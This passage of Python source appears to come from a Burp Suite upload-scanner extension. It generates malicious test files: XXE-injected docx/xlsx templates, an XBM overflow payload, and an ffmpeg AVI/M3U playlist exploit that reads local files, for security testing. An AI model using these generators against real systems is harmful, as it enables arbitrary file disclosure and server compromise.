        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
        FIpCyC"""
        self._xlsx_content = self._xlsx_content.decode("base64").decode("zlib")

        self._xmltag = '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
        self._xmltag_standalone_no = '<?xml version="1.0" encoding="UTF-8" standalone="no"?>'
        self._creator = '<dc:creator>user</dc:creator>'
        self._creator_tagname = "dc:creator"

    def _create_docx(self, markers, filenames=None):
        return self._create_office_document_xxe(markers, self._docx_content, filenames=filenames)

    def _create_xlsx(self, markers, filenames=None):
        return self._create_office_document_xxe(markers, self._xlsx_content, filenames=filenames)

    def _create_office_document_xxe(self, markers, content, filenames=None):
        zipincontent = BytesIO(content)
        zipoutcontent = BytesIO()
        zin = zipfile.ZipFile(zipincontent, "r")
        zout = zipfile.ZipFile(zipoutcontent, 'w')
        for item in zin.infolist():
            orig_content = zin.read(item.filename)
            file_content = orig_content
            if not filenames or item.filename in filenames:
                for marker, replace_str in markers:
                    if marker in file_content:
                        # print "found", marker, "replacing with", replace_str
                        file_content = file_content.replace(marker, replace_str)
                    else:
                        # if not all markers are in there, use the original content
                        file_content = orig_content
                        break
            # Attention: These office documents have the placeholder, not a real Burp Collaborator URL yet
            zout.writestr(item, file_content)
        zout.close()
        zin.close()
        zipoutcontent.seek(0)
        c = zipoutcontent.read()
        zipincontent.close()
        zipoutcontent.close()
        return c

    def _inject_burp_url(self, content, burp_url):
        zipincontent = BytesIO(content)
        zipoutcontent = BytesIO()
        zin = zipfile.ZipFile(zipincontent, "r")
        zout = zipfile.ZipFile(zipoutcontent, 'w')
        for item in zin.infolist():
            orig_content = zin.read(item.filename)
            file_content = orig_content.replace(BurpExtender.MARKER_COLLAB_URL, burp_url)
            zout.writestr(item, file_content)
        zout.close()
        zin.close()
        zipoutcontent.seek(0)
        c = zipoutcontent.read()
        zipincontent.close()
        zipoutcontent.close()
        return c

    def get_files(self, formats=None):
        # The formats parameter specifies the formats the *module* wants to send
        # The self._enabled_formats specifies the user enabled in the UI
        # Make sure we only take the intersection between what the module wants and what is enabled in the UI
        if formats:
            formats = set(formats) & set(self._enabled_formats)
        else:
            formats = self._enabled_formats
        for filenames_desc, filenames in [
            # TODO feature: I really don't know into which files we should inject... this is just a wild guess
            ("All", None),  # As the .rels files is parsed first, mostly this will work when .rels parser is vulnerable
            ("ContentTypes", ["[Content_Types.xml]", ]),
            ("Main", ["word/document.xml", "xl/workbook.xml"])  # "ppt/presentation.xml"
        ]:
            techniques = Xxe.get_root_tag_techniques(self._xmltag, self._xmltag_standalone_no)
            for name in techniques:
                if ".docx" in formats:
                    yield techniques[name][-1][-1], name + filenames_desc, ".docx", self._create_docx(techniques[name],
                                                                                                      filenames=filenames)
                if ".xlsx" in formats:
                    yield techniques[name][-1][-1], name + filenames_desc, ".xlsx", self._create_xlsx(techniques[name],
                                                                                                      filenames=filenames)

        # TODO feature: For now we only do the following injections for docProps/core.xml which includes the dc:creator tag.
        # Is there a point to do it in other XML tags in other XMLs too? Which ones?
        filenames_desc = "Core"
        filenames = ["docProps/core.xml"]
        techniques = Xxe.get_tag_techniques(self._xmltag, self._xmltag_standalone_no, self._creator,
                                            self._creator_tagname)
        for name in techniques:
            if ".docx" in formats:
                yield techniques[name][-1][-1], name + filenames_desc, ".docx", self._create_docx(techniques[name],
                                                                                                  filenames=filenames)
            if ".xlsx" in formats:
                yield techniques[name][-1][-1], name + filenames_desc, ".xlsx", self._create_xlsx(techniques[name],
                                                                                                  filenames=filenames)


class Xbm(object):

    def __init__(self, name):
        self.name = name

    def create_xbm(self, width, height, bytes_per_line=12):
        xbm = "#define {}_width {}\n".format(self.name, width)
        xbm += "#define {}_height {}\n".format(self.name, height)
        xbm += "static char {}_bits[] = {{\n".format(self.name)
        no_of_bytes = (width * height) / 8
        xbm += "  0x80000001, " #  the value causing the overflow, from orig PoC
        #xbm += "  0xffffffff, "
        first_line = "0x00, " * (bytes_per_line - 1)
        xbm += first_line + "\n"
        no_of_bytes -= bytes_per_line
        while no_of_bytes > 0:
            bytes_this_line = min(bytes_per_line, no_of_bytes)
            line = "0x00, " * bytes_this_line
            xbm += "  " + line + "\n"
            no_of_bytes -= bytes_this_line
        xbm += "};\n"
        return xbm





class AviM3uXbin(object):
    # Implementation taken from https://github.com/neex/ffmpeg-avi-m3u-xbin/blob/master/gen_xbin_avi.py
    # and edited for our needs
    # TODO feature: Maybe make smaller, we actually don't need the AES and /dev/zero trick for detection only...
    AVI_HEADER = "RIFF\x00\x00\x00\x00AVI LIST\x14\x01\x00\x00hdrlavih8\x00\x00\x00@\x9c\x00\x00\x00\x00\x00\x00\x00\x00\x00" \
                 "\x00\x10\x00\x00\x00}\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00\xe0\x00\x00\x00\xa0\x00" \
                 "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00LISTt\x00\x00\x00strlstrh8\x00\x00" \
                 "\x00txts\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x19\x00\x00\x00" \
                 "\x00\x00\x00\x00}\x00\x00\x00\x86\x03\x00\x00\x10'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xe0\x00\xa0\x00" \
                 "strf(\x00\x00\x00(\x00\x00\x00\xe0\x00\x00\x00\xa0\x00\x00\x00\x01\x00\x18\x00XVID\x00H\x03\x00\x00\x00\x00" \
                 "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00LIST    movi"

    ECHO_TEMPLATE = """### echoing {needed!r}
    #EXT-X-KEY: METHOD=AES-128, URI=/dev/zero, IV=0x{iv}
    #EXTINF:1,
    #EXT-X-BYTERANGE: 16
    /dev/zero
    #EXT-X-KEY: METHOD=NONE
    """

    # AES.new('\x00'*16).decrypt('\x00'*16)
    GAMMA = b'\x14\x0f\x0f\x10\x11\xb5"=yXw\x17\xff\xd9\xec:'

    FULL_PLAYLIST = """#EXTM3U
    #EXT-X-MEDIA-SEQUENCE:0
    {content}
    #### random string to prevent caching: {rand}
    #EXT-X-ENDLIST"""

    EXTERNAL_REFERENCE_PLAYLIST = """
    ####  External reference: reading {size} bytes from {filename} (offset {offset})
    #EXTINF:1,
    #EXT-X-BYTERANGE: {size}@{offset}
    {filename}
    """

    XBIN_HEADER = 'XBIN\x1A\x20\x00\x0f\x00\x10\x04\x01\x00\x00\x00\x00'

    def __init__(self):
        self.test_xbin_sync(self.gen_xbin_sync())
        self.sync = self.echo_seq(self.gen_xbin_sync())

    def echo_block(self, block):
        assert len(block) == 16
        iv = ''.join(map('{:02x}'.format, [ord(x) ^ ord(y) for (x, y) in zip(block, AviM3uXbin.GAMMA)]))
        return AviM3uXbin.ECHO_TEMPLATE.format(needed=block, iv=iv)

    def gen_xbin_sync(self):
        seq = []
        for i in range(60):
            if i % 2:
                seq.append(0)
            else:
                seq.append(128 + 64 - i - 1)
        for i in range(4, 0, -1):
            seq.append(128 + i - 1)
        seq.append(0)
        seq.append(0)
        for i in range(12, 0, -1):
            seq.append(128 + i - 1)
        seq.append(0)
        seq.append(0)
        return ''.join([chr(x) for x in seq])

    def test_xbin_sync(self, seq_str):
        seq = [ord(x) for x in seq_str]
        for start_ind in range(64):
            path = [start_ind]
            cur_ind = start_ind
            while cur_ind < len(seq):
                if seq[cur_ind] == 0:
                    cur_ind += 3
                else:
                    assert seq[cur_ind] & (64 + 128) == 128
                    cur_ind += (seq[cur_ind] & 63) + 3
                path.append(cur_ind)
            assert cur_ind == len(seq), "problem for path {}".format(path)

    def echo_seq(self, s):
        assert len(s) % 16 == 0
        res = []
        for i in range(0, len(s), 16):
            res.append(self.echo_block(s[i:i + 16]))
        return ''.join(res)

    def make_playlist_avi(self, playlist, fake_packets=1000, fake_packet_len=3):
        content = 'GAB2\x00\x02\x00' + '\x00' * 10 + playlist.encode('ascii')
        packet = '00tx' + struct.pack('<I', len(content)) + content
        dcpkt = '00dc' + struct.pack('<I', fake_packet_len) + '\x00' * fake_packet_len
        return AviM3uXbin.AVI_HEADER + packet + dcpkt * fake_packets

    def gen_xbin_packet_header(self, size):
        return '\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00'+chr(128 + size - 1)+'\n'

    def gen_xbin_packet_playlist(self, filename, offset, packet_size):
        result = []
        while packet_size > 0:
            packet_size -= 16
            assert packet_size > 0
            part_size = min(packet_size, 64)
            packet_size -= part_size
            result.append(self.echo_block(self.gen_xbin_packet_header(part_size)))
            result.append(
                AviM3uXbin.EXTERNAL_REFERENCE_PLAYLIST.format(
                    size=part_size,
                    offset=offset,
                    filename=filename))
            offset += part_size
        return ''.join(result), offset

    def gen_xbin_playlist(self, filename_to_read):
        pls = [self.echo_block(AviM3uXbin.XBIN_HEADER)]
        next_delta = 5
        for max_offs, filename in (
                (5000, filename_to_read), (500, "file:///dev/zero")):
            offset = 0
            while offset < max_offs:
                for _ in range(10):
                    pls_part, new_offset = self.gen_xbin_packet_playlist(
                        filename, offset, 0xf0 - next_delta)
                    pls.append(pls_part)
                    next_delta = 0
                offset = new_offset
            pls.append(self.sync)
        return AviM3uXbin.FULL_PLAYLIST.format(content=''.join(pls), rand=''.join(
            random.choice(string.ascii_lowercase) for _ in range(30)))

    def get_avi_file(self, _, url):
        content = self.gen_xbin_playlist(url)
        avi = self.make_playlist_avi(content)
        return avi


class FingerpingImages:
    all_images = {
        'CESA-2004-001': 'eJzrDPBz5+WS4mJgYOD19HAJAtJ/QZiDmYGB0fzNxgggxVAS5Bf8f2QDhuDv7KrAgGFJd/R1ZGDY\n2M/9J5EVyOcs8IgsZmDgOwTCjKIaXg1AQbES14iS4Py0kvLEolSGgsTMvBK9vNQSBRM9A+sXXzMZ\nGLh0PV0cQyri3t51n5ziLtpw8WC18YEHreJyLd/vcfZ/ULCZ5FDBf2j3yv++5dclM9V+GG1f27Er\nfWLh57f7VtToTy99Gijdf7fi/rHf5u/u/PhyLN3MbuvHj3NXxgvNalFb6JkBodJ3v/kVL8PXHj/T\nf+U/7/8/n0T+qT8/7bX5p1aQmks39Xb++zU93+d5C5S7Pe771/OxNpZzf71Of//74Yd+4bXzJ9df\nq/nz6u8lZbCpJdu81+3f8THvyPygv7z8835PXrP/8/v2wz9v17uB7Zz7NjHgvwBUKbprZv9ShXNo\npGD3p45e93ybvMfK0vI3fvw5lm5ut/HjRoxwoYNL6KDA+uOvue55NnWPD0vL3/3x6Ji42b1NH5/J\nzvXNQFI31zddGEXX5ZtIPGCsl5ih2GI2qp1e2tftSXkcKt1/s+LQMXZzuy0f5/WW5+2pTX81HVXZ\nsjpPFGNzh6QCvz3/nkrr3614euy12bubFZeP3Ta7t/VjH0bWtL52/9/2ww95xS/rQoSr3v07/PCD\n9GdWSCD/m7+br93+zo+3+f9Pv+4/DFP07F/93erztfV7LePBJm3cvuN1+bTTq/e/P29vHV3/53x1\n/+1ip8kXVExkq/O/GqywL7v/fbm87HZI2Wf17d6rhb/mx/0JvCvtv/zfXvGD7e/Pn5y//l7kn6V3\nK+zN4wVAjnt5o3r15w+z8/eomXD6gs0CUQ/MvnrDOUDqZU7wfhVkBefooKDsqai0/u2Kj8c+m83b\n/3Fqb37OntLHd60HwCX08Oyjr+tvVnw9Ntls3o6Pb3qf59WUPraWvn975iAok2mgQHh9/bVjxmbz\nNn180iueY5P+OFv6/p0f785d0UcKlAtLNvv+nXQBKaCsbg9JBXMr/hqbz9v38Urv8tyYuxUPj3Wb\n7dtX+B3Dt7FFf2XbDz9sfzZ59f7H37fH7v12oPknNMFMj6p/23/fLjr+9+3bfbeFV9uXxf/+ur3v\n9uSV+78dODr/ylzZP8Fr7K3eTn6/+jvz7uDVwBaNXI/9zl+zz//VvBb/9+TD+8/z/1tCg//0+v2d\nAxgcRX/vlv/n7076m5PhoPsG2LRk8HT1c1nnlNAEAEMrzGs=\n'.decode("base64").decode("zlib"),
        'CVE-2014-0333': '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\n'.decode("base64").decode("zlib"),
